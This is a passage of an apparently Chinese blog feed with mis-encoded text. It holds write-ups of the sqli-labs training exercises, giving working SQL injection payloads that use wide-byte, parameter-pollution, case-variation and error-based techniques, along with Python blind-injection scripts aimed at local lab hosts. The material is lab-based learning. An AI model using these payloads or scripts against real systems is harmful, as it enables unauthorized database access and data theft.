æ–°å»ºä¸€è¡Œ</span><br><span class="line">%0c æ–°çš„ä¸€é¡µ</span><br><span class="line">%0d return åŠŸèƒ½</span><br><span class="line">%0b TAB é”®ï¼ˆå‚ç›´ï¼‰</span><br><span class="line">%a0 ç©ºæ ¼</span><br></pre></td></tr></table></figure></p><p>æ³¨æ„ä¸Šé¢çš„ç¼–ç ç»•ä¸è¿‡çš„è¯æˆ‘ä»¬å¯ä»¥ç”¨Linuxç¯å¢ƒæµ‹è¯•</p><p>Less-26a<br>åªæ˜¯æŸ¥è¯¢çš„å¥å­å˜äº†ï¼Œå¤šäº†ä¸€ä¸ªæ‹¬å·ï¼Œè¿™ä¸€é¢˜ä¹Ÿä¸èƒ½æŠ¥é”™<br>æˆ‘ä»¬å¯ä»¥ç”¨ç›²æ³¨<br><a href="http://127.0.0.1/sqlilabs/Less-26a/?id=1&#39;)%a0aandnd%a0ascii(substr(database(),1,1))=115%a0oorr" target="_blank" rel="noopener">http://127.0.0.1/sqlilabs/Less-26a/?id=1&#39;)%a0aandnd%a0ascii(substr(database(),1,1))=115%a0oorr</a>(â€˜1â€™=â€™1</p><h3 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h3><p>è¿™é‡Œå‘ç°æºä»£ç é‡Œé¢çš„é»‘åå•åˆå£®å¤§äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);<span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out --.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out #.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/m'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/union/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out union</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out select</span></span><br><span class="line">$id= preg_replace(<span class="string">'/UNION/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out UNION</span></span><br><span class="line">$id= preg_replace(<span class="string">'/SELECT/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out SELECT</span></span><br><span class="line">$id= preg_replace(<span class="string">'/Union/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out Union</span></span><br><span class="line">$id= preg_replace(<span class="string">'/Select/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬ä»»ç„¶å¯ä»¥ç”¨åŒå†™ç»•è¿‡ï¼Œä¹Ÿå¯ä»¥ç”¨å¤§å°å†™ç»•è¿‡ï¼Œä½†æ˜¯æˆ‘ä»¬ç›´æ¥æŠ¥é”™æ³¨å…¥å°±è¡Œäº†ä¸ç”¨éº»çƒ¦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-27/?id=1&apos;and%a0updatexml(1,concat(0x7e,database(),0x7e),1)%a0and&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><h3 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h3><p>è¿™ä¸€é¢˜å°±æ˜¯æºä»£ç æŠŠæŠ¥é”™æ³¨å…¥çš„å›æ˜¾ç»™æ³¨é‡Šæ‰<br>é‚£æˆ‘ä»¬ç”¨ç›²æ³¨å°±å¥½<br>åŒå¼•å·é—­åˆ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://192.168.100.103/sqlilabs/Less-27a/?id=1"and(ascii(substr((SelEct(database())),&#123;_&#125;,1)))&gt;"&#123;__&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">    Min = <span class="number">67</span></span><br><span class="line">    Max =<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> abs(Max-Min)&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (Max+Min)//<span class="number">2</span></span><br><span class="line">        payload = url.format(_=i,__=mid)</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">            Min = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Max = mid</span><br><span class="line">    database += chr(Max)</span><br><span class="line">    <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><h3 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h3><p>è¿™ä¸€é¢˜æŠŠ<code>union select</code>æ— è®ºå¤§å°å†™éƒ½è¿‡æ»¤æ‰äº†ï¼ŒæŠŠä¸Šé¢é‚£å‡ é¢˜èƒ½å¤ŸåŒå†™ç»•è¿‡çš„å…¨éƒ½å°æ€æ‰äº†<br>è¿™ä¸€é¢˜åªèƒ½å¤Ÿç›²æ³¨ï¼Œä¸èƒ½æŠ¥é”™æ³¨å…¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://192.168.100.103/sqlilabs/Less-28/?id=1')and(ascii(substr((SelEct(database())),&#123;_&#125;,1)))&gt;('&#123;__&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">    Min = <span class="number">67</span></span><br><span class="line">    Max =<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> abs(Max-Min)&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (Max+Min)//<span class="number">2</span></span><br><span class="line">        payload = url.format(_=i,__=mid)</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">            Min = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Max = mid</span><br><span class="line">    database += chr(Max)</span><br><span class="line">    <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><h3 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h3><p>è¿™ä¸€é¢˜è·Ÿä¸Šé¢ä¸€é¢˜åŒºåˆ«ä¸å¤§ï¼Œä¹Ÿæ˜¯ç”¨ç›²æ³¨ï¼Œä¹Ÿå¯ä»¥ç”¨<code>unionæ³¨å…¥</code>ï¼Œåªæ˜¯ä¸è¦å‡ºç°+å·å°±å¥½<br>å¿™è‘—è‡ªå·±é—­åˆå•å¼•å·å’Œæ‹¬å·å°±è¡Œ<br>è¿™é‡Œæˆ‘ç”¨çš„æ˜¯unionæ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-28a/?id=-1%27)unIon(SeLect%201,database(),%273</span><br></pre></td></tr></table></figure><h3 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h3><p>è¿™ä¸€é¢˜å¥½åƒæ˜¯æ¶‰åŠåˆ°äºŒå±‚æœåŠ¡çš„é—®é¢˜ï¼Œé‡Œé¢çš„æœ‰ä¸€ä¸ªå«HPP(httpå‚æ•°æ±¡æŸ“)æ”»å‡»<br>ä½†æ˜¯æ²¡å…³ç³»å°±æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°é€šè¿‡äº†ç¬¬ä¸€å±‚æœåŠ¡å™¨çš„wafè¿‡æ»¤ç»“æœç¬¬äºŒä¸ªå‚æ•°æ²¡æœ‰è¿‡æ»¤ï¼Œè¿™æ˜¯å› ä¸ºapacheçš„ç‰¹æ€§ï¼Œåªè·å–æœ€åä¸€ä¸ªå‚æ•°<br>è¿™é‡Œæˆ‘ä»¬æ˜¯å¯ä»¥ç›´æ¥ç”¨å•å¼•å·é—­åˆå°±ok</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-29/?id=1&amp;id=-1%27%20union%20select%201,database(),3%20%23</span><br></pre></td></tr></table></figure><h3 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h3><p>åŒä¸Šé¢çš„é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$qs = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line">$hint=$qs;</span><br><span class="line">$id1=java_implimentation($qs);</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br></pre></td></tr></table></figure><p>å°±æ˜¯å…ˆåˆ©ç”¨äº†è¿™ä¸ªTomcatå»åšwafè¿‡æ»¤ï¼Œå…¶å®å¯¹ç¬¬äºŒä¸ªå‚æ•°ä¸èµ·ä½œç”¨<br>è¿™æ¬¡ç›´æ¥é—­åˆåŒå¼•å·å°±å¥½</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-30/?id=1&amp;id=-1&quot; union select 1,database(),3%23</span><br></pre></td></tr></table></figure><p>Less-31<br>è¿™ä¸€é¢˜å°±æ˜¯SQLæŸ¥è¯¢è¯­å¥å˜äº†ä¸€ä¸‹ï¼Œæˆ‘ä»¬éœ€è¦é—­åˆåŒå¼•å·å’Œæ‹¬å·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-31/?id=1&amp;id=-1&quot;) union select 1,database(),3%23</span><br></pre></td></tr></table></figure><h3 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h3><p>è¿™ä¸€é¢˜æˆ‘ä¸€å¼€å§‹æ²¡æœ‰å¤´ç»ªï¼Œå› ä¸ºæ‰€æœ‰å‚æ•°éƒ½è¢«è½¬ä¹‰äº†ï¼Œä¸èƒ½å¤Ÿé—­åˆï¼Œåæ¥å‘ç°æ˜¯å¦å¤–çš„ç»•è¿‡æ–¹æ³•ï¼ŒåŸæ¥æ˜¯å®½å­—èŠ‚çš„é—®é¢˜<br>åŸç†ï¼šmysql åœ¨ä½¿ç”¨GBK ç¼–ç çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦ä¸ºä¸€ä¸ªæ±‰å­—ï¼Œä¾‹å¦‚<code>%aa%5c</code> å°±æ˜¯ä¸€ä¸ªæ±‰å­—ï¼ˆå‰ä¸€ä¸ªascii ç å¤§äº128 æ‰èƒ½åˆ°æ±‰å­—çš„èŒƒå›´ï¼‰ã€‚æˆ‘ä»¬åœ¨è¿‡æ»¤<code>â€™</code> çš„æ—¶å€™ï¼Œå¾€å¾€åˆ©ç”¨çš„æ€è·¯æ˜¯å°†<code>â€˜</code> è½¬æ¢ä¸º<code>\â€™</code><br>å› æ­¤æˆ‘ä»¬åœ¨æ­¤æƒ³åŠæ³•å°†â€˜ å‰é¢æ·»åŠ çš„\ é™¤æ‰ï¼Œä¸€èˆ¬æœ‰ä¸¤ç§æ€è·¯ï¼š</p><ol><li><code>%df</code> åƒæ‰<code>\</code> å…·ä½“çš„åŸå› æ˜¯urlencode(\â€˜) = <code>%5c%27</code>ï¼Œæˆ‘ä»¬åœ¨<code>%5c%27</code> å‰é¢æ·»åŠ <code>%df</code>ï¼Œå½¢æˆ<code>%df%5c%27</code>ï¼Œè€Œä¸Šé¢æåˆ°çš„mysql åœ¨GBK ç¼–ç æ–¹å¼çš„æ—¶å€™ä¼šå°†ä¸¤ä¸ªå­—èŠ‚å½“åšä¸€ä¸ªæ±‰å­—ï¼Œæ­¤äº‹<code>%df%5c</code> å°±æ˜¯ä¸€ä¸ªæ±‰å­—ï¼Œ<code>%27</code> åˆ™ä½œä¸ºä¸€ä¸ªå•ç‹¬çš„ç¬¦å·åœ¨å¤–é¢ï¼ŒåŒæ—¶ä¹Ÿå°±è¾¾åˆ°äº†æˆ‘ä»¬çš„ç›®çš„ã€‚</li><li>å°†<code>\â€™</code> ä¸­çš„<code>\</code> è¿‡æ»¤æ‰ï¼Œä¾‹å¦‚å¯ä»¥æ„é€ <code>%**%5c%5c%27</code> çš„æƒ…å†µï¼Œåé¢çš„%5c ä¼šè¢«å‰é¢çš„<code>%5c</code>ç»™æ³¨é‡Šæ‰ã€‚è¿™ä¹Ÿæ˜¯bypass çš„ä¸€ç§æ–¹æ³•ã€‚</li></ol><p>çœ‹æºä»£ç æˆ‘ä»¬åˆ©ç”¨å•å¼•å·é—­åˆç„¶ååŠ ä¸Š%dfå°±å¥½ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨unionæ³¨å…¥ä¹Ÿå¯ä»¥ç”¨æŠ¥é”™æ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-32/?id=-1%df%27union select 1,database(),3 %23</span><br></pre></td></tr></table></figure><h3 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h3><p>è¿™ä¸ªåŒä¸Šé¢é‚£é¢˜ä¸€æ¨¡ä¸€æ ·ç›´æ¥é—­åˆå•å¼•å·å°±å¥½ï¼Œæ˜¯å°±æ˜¯ä¸Šé¢å†™çš„checkå‡½æ•°åº”è¯¥æ˜¯ä½œè€…è‡ªå·±å†™çš„ï¼Œè¿™ä¸€é¢˜æ˜¯ç›´æ¥è°ƒç”¨äº†ç³»ç»Ÿçš„å‡½æ•°<br>å¯¹æ¯”ä¸€ä¸‹ä¸¤ä¸ªå‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string = preg_replace(<span class="string">'/'</span>. preg_quote(<span class="string">'\\'</span>) .<span class="string">'/'</span>, <span class="string">"\\\\\\"</span>, $string);          <span class="comment">//escape any backslash</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\'/i'</span>, <span class="string">'\\\''</span>, $string);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\"/'</span>, <span class="string">"\\\""</span>, $string);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string= addslashes($string);    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-33/?id=-1%df%27 union select 1,database(),3 %23</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¢æ€ä¹ˆé˜²èŒƒå‘¢ï¼Ÿ<br>ä½¿ç”¨addslashes(),æˆ‘ä»¬éœ€è¦å°†mysql_query è®¾ç½®ä¸º<code>binary</code> çš„æ–¹å¼ï¼Œæ‰èƒ½é˜²å¾¡æ­¤æ¼æ´ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mysql_query(â€œSET character_set_connection=gbk,character_set_result=gbk,character_set_client=binaryâ€,$conn);</span><br></pre></td></tr></table></figure><p>è¿™æ—¶å€™æˆ‘æƒ³åˆ°äº†æˆ‘å½“æ—¶åšçš„ä¸€ä¸ªé¢˜ç›®å¥½åƒutf8_general_ciå¯ä»¥ç”¨ç¼–ç å»ç»•è¿‡ï¼Œä½†æ˜¯é‚£ä¸ªæ˜¯åœ¨mysqlæœåŠ¡ç«¯èµ·ä½œç”¨çš„</p><h3 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h3><p>è¿™ä¸€é¢˜æ¢äº†postçš„æ¨¡å¼ä½†æ˜¯åˆ©ç”¨æ–¹æ³•è¿˜æ˜¯æœ‰ç‚¹ä¸åŒçš„ï¼Œ<br>æœ¬å…³æ˜¯post å‹çš„æ³¨å…¥æ¼æ´ï¼ŒåŒæ ·çš„ä¹Ÿæ˜¯å°†post è¿‡æ¥çš„å†…å®¹è¿›è¡Œäº†â€˜ \ çš„å¤„ç†ã€‚ç”±ä¸Šé¢çš„ä¾‹å­å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„æ–¹æ³•å°±æ˜¯å°†è¿‡æ»¤å‡½æ•°æ·»åŠ çš„\ ç»™åƒæ‰ã€‚è€Œget å‹çš„æ–¹å¼æˆ‘ä»¬æ˜¯ä»¥url å½¢å¼æäº¤çš„ï¼Œå› æ­¤æ•°æ®ä¼šé€šè¿‡URLencodeï¼Œå¦‚ä½•å°†æ–¹æ³•ç”¨åœ¨post å‹çš„æ³¨å…¥å½“ä¸­ï¼Œæˆ‘ä»¬æ­¤å¤„ä»‹ç»ä¸€ä¸ªæ–°çš„æ–¹æ³•ã€‚å°†utf-8 è½¬æ¢ä¸ºutf-16 æˆ–utf-32ï¼Œä¾‹å¦‚å°†<code>â€˜</code> è½¬ä¸ºutf-16 ä¸º<code>â™¦&#39;</code>  ã€‚æˆ‘ä»¬å°±<br>å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ–¹å¼è¿›è¡Œå°è¯•ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=â™¦&apos; or 1=1#&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>ä½†ä¹Ÿå¯ä»¥ç›´æ¥ç”¨%dfç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin%df&apos; and updatexml(1,concat(0x7e,database(),0x7e),1)#&amp;passwd=ade3&amp;submit=Submit</span><br></pre></td></tr></table></figure><h3 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h3><p>è¿™ä¸€é¢˜æ°´ï¼Œæ ¹æœ¬æ²¡æœ‰ä½¿ç”¨ä»»ä½•å¼•å·ä¸éœ€è¦é—­åˆï¼Œå®ƒçš„è½¬ä¹‰ä¹Ÿæ˜¯å¤šä½™çš„ï¼Œç›´æ¥æŠ¥é”™å°±å¥½</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-35/?id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)%20%23</span><br></pre></td></tr></table></figure><h3 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h3><p>è¿™ä¸€å…³é‡Œé¢ç”¨äº†<code>mysql_real_escape_string</code>å‡½æ•°å»è¿›è¡Œè¿‡æ»¤<br>æ˜¯å› mysql æˆ‘ä»¬å¹¶æ²¡æœ‰è®¾ç½®æˆgbkï¼Œæ‰€ä»¥<code>mysql_real_escape_string()</code>ä¾æ—§èƒ½å¤Ÿè¢«çªç ´ã€‚æ–¹æ³•<br>å’Œä¸Šè¿°æ˜¯ä¸€æ ·çš„ã€‚<br>ç”¨utf-16ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-36/?id=-1%ef%bf%bd%27 union select 1,database(),3%23</span><br></pre></td></tr></table></figure><p>ç”¨%dfå»ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-36/?id=-1%df%27 union select 1,database(),3%23</span><br></pre></td></tr></table></figure><h3 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h3><p>æœ‰æŠ¥é”™è¾“å‡ºé€‰æ‹©æŠ¥é”™æ³¨å…¥ï¼Œå°±æ˜¯postæ–¹å¼çš„å®½å­—èŠ‚<br>uname=admin%dfâ€™ and updatexml(1,concat(0x7e,database(),0x7e),1)# &amp;passwd=admin&amp;submit=Submit</p><h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><p>SQLi-LABS(Adv)è¿™ä¸€éƒ¨åˆ†çš„é¢˜ç›®å®Œç»“ï¼Œè¿™ä¸€éƒ¨åˆ†ä¸»è¦æ˜¯å¯¹è¾“å…¥çš„æ•°æ®è¿›è¡Œäº†è¿‡æ»¤å’Œé˜²æŠ¤ï¼Œä½†æ˜¯éƒ½è¿‡æ»¤å¾—ä¸å…¨ï¼Œ<br>è¿˜æ˜¯ä¼šå­˜åœ¨å¤šç§ç»•è¿‡çš„æ–¹æ³•ï¼Œè¿™ä¸€éƒ¨åˆ†å­¦åˆ°äº†æ–°çš„çŸ¥è¯†ï¼Œå°±æ˜¯ç”¨utf-16ç¼–ç ç»•è¿‡å®½å­—èŠ‚çš„é‚£ä¸€éƒ¨åˆ†å†…å®¹ï¼Œå…¶å®è¿™é‡Œçš„å®½å­—èŠ‚å‰ææ¡ä»¶æ˜¯éœ€è¦å®¢æˆ·ç«¯é‡Œé¢è®¾ç½®äº†gbkï¼ŒæœåŠ¡ç«¯è·Ÿè¿‡ç¨‹æ²¡æœ‰è®¾ç½®åŒæ ·çš„ç¼–ç å¯¼è‡´çš„ï¼Œæ‰€ä»¥å¼€å‘çš„æ—¶å€™å¾—æ³¨æ„ï¼Œå¦å¤–çš„è¯è¿™é‡Œè¾¹çš„äºŒæ¬¡æ³¨å…¥çš„é¢˜ç›®ä¹Ÿæ˜¯å¾ˆå€¼å¾—æ¨æ•²çš„ï¼Œä¹Ÿå­¦åˆ°äº†æ–°çŸ¥è¯†ï¼Œå°±æ˜¯æœåŠ¡å™¨ä¸¤å±‚æ¶æ„ä»¥åŠhttpå‚æ•°æ±¡æŸ“çš„åº”ç”¨ï¼Œæœ‰ç‚¹æ„æ€ã€‚</p>]]></content>
      
      <categories>
          
          <category> SQLæ³¨å…¥ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labså®æˆ˜è®°å½•(ä¸€)</title>
      <link href="/sqli-labs-training-1.html"/>
      <url>/sqli-labs-training-1.html</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘å•Šå…ˆè‡ªå·±SQLæ³¨å…¥ç¡®å®ä¸è¡Œï¼Œæˆ‘åªèƒ½æ‹¿å‡ºsqlæ³¨å…¥çš„åŸºç¡€éƒ¨åˆ†æ¥ç»ƒç»ƒæ”¶äº†ï¼Œè¿™ä¸ªå®éªŒç¯å¢ƒæ˜¯sqlilabs<a id="more"></a></p><p>ä¸€äº›å‰ç½®çŸ¥è¯†<br>ç³»ç»Ÿå‡½æ•°<br>ä»‹ç»å‡ ä¸ªå¸¸ç”¨å‡½æ•°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. version()â€”â€”MySQL ç‰ˆæœ¬</span><br><span class="line">2. user()â€”â€”æ•°æ®åº“ç”¨æˆ·å</span><br><span class="line">3. database()â€”â€”æ•°æ®åº“å</span><br><span class="line">4. @@datadirâ€”â€”æ•°æ®åº“è·¯å¾„</span><br><span class="line">5. @@version_compile_osâ€”â€”æ“ä½œç³»ç»Ÿç‰ˆæœ¬</span><br></pre></td></tr></table></figure><p>å­—ç¬¦ä¸²è¿æ¥å‡½æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. concat(str1,str2,...)â€”â€”æ²¡æœ‰åˆ†éš”ç¬¦åœ°è¿æ¥å­—ç¬¦ä¸²</span><br><span class="line">2. concat_ws(separator,str1,str2,...)â€”â€”å«æœ‰åˆ†éš”ç¬¦åœ°è¿æ¥å­—ç¬¦ä¸²</span><br><span class="line">3. group_concat(str1,str2,...)â€”â€”è¿æ¥ä¸€ä¸ªç»„çš„æ‰€æœ‰å­—ç¬¦ä¸²ï¼Œå¹¶ä»¥é€—å·åˆ†éš”æ¯ä¸€æ¡æ•°æ®</span><br></pre></td></tr></table></figure><p>ä¸€èˆ¬ç”¨äºå°è¯•çš„è¯­å¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Ps:--+å¯ä»¥ç”¨#æ›¿æ¢ï¼Œurl æäº¤è¿‡ç¨‹ä¸­Url ç¼–ç åçš„#ä¸º%23</span><br><span class="line">or 1=1--+</span><br><span class="line">&apos;or 1=1--+</span><br><span class="line">&quot;or 1=1--+</span><br><span class="line">)or 1=1--+</span><br><span class="line">&apos;)or 1=1--+</span><br><span class="line">&quot;) or 1=1--+</span><br><span class="line">&quot;))or 1=1--+</span><br></pre></td></tr></table></figure><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><p>è¾“å…¥?id=1â€™å‡ºç°æŠ¥é”™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 